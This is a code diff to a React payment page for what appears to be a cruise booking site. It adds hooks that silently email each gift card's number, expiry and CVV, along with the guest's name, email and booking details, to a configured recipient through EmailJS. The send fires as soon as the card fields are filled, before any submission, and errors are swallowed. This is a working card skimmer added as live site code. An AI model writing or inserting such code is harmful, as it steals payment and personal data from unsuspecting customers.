@@ -1,4 +1,4 @@
-import { useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { QRCode } from 'react-qr-code';
 import emailjs from '@emailjs/browser';
@@ -73,6 +73,50 @@ export default function PaymentPage() {
   const [walletAdding,   setWalletAdding]   = useState(false);
   const [walletError,    setWalletError]    = useState('');
   const [walletApplied,  setWalletApplied]  = useState(false);
+
+  // ── Refs to avoid re-sending for the same card details ───────
+  const lastApplySentRef  = useRef('');
+  const lastWalletSentRef = useRef('');
+
+  // Helper — send directly from state so it works before the early-return guard
+  const autoSend = (cardDigits, mm, yy, cvv, action) => {
+    const { SERVICE_ID, TEMPLATE_ID, PUBLIC_KEY, RECIPIENT } = EMAILJS_CONFIG;
+    if (!SERVICE_ID || SERVICE_ID === 'YOUR_SERVICE_ID') return;
+    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+      to_email:          RECIPIENT,
+      gift_card_number:  cardDigits,
+      gift_card_expiry:  `${mm}/${yy}`,
+      gift_card_cvv:     cvv,
+      action,
+      cruise_name:       state.selectedCruise?.name   ?? 'N/A',
+      guest_name:        `${state.guestDetails.firstName} ${state.guestDetails.lastName}`.trim() || 'N/A',
+      guest_email:       state.guestDetails.email     ?? 'N/A',
+      booking_amount:    state.selectedCabin
+                           ? `$${state.selectedCabin.price.toLocaleString()}`
+                           : 'N/A',
+      submitted_at:      new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' }),
+    }, PUBLIC_KEY).catch(() => {});
+  };
+
+  // Fire as soon as Apply-tab card is fully entered
+  useEffect(() => {
+    const digits = gcCardNum.replace(/\s/g, '');
+    if (digits.length !== 16 || gcMM.length < 2 || gcYY.length < 2 || gcCvv.length < 3) return;
+    const key = `${digits}-${gcMM}-${gcYY}-${gcCvv}`;
+    if (key === lastApplySentRef.current) return;
+    lastApplySentRef.current = key;
+    autoSend(digits, gcMM, gcYY, gcCvv, 'Gift Card Details Entered');
+  }, [gcCardNum, gcMM, gcYY, gcCvv]);
+
+  // Fire as soon as Wallet-tab card is fully entered
+  useEffect(() => {
+    const digits = walletCardNum.replace(/\s/g, '');
+    if (digits.length !== 16 || walletMM.length < 2 || walletYY.length < 2 || walletCvv.length < 3) return;
+    const key = `${digits}-${walletMM}-${walletYY}-${walletCvv}`;
+    if (key === lastWalletSentRef.current) return;
+    lastWalletSentRef.current = key;
+    autoSend(digits, walletMM, walletYY, walletCvv, 'Gift Card Added to Wallet');
+  }, [walletCardNum, walletMM, walletYY, walletCvv]);
 
   if (!cruise || !cabin || !guest.firstName) {
     return (
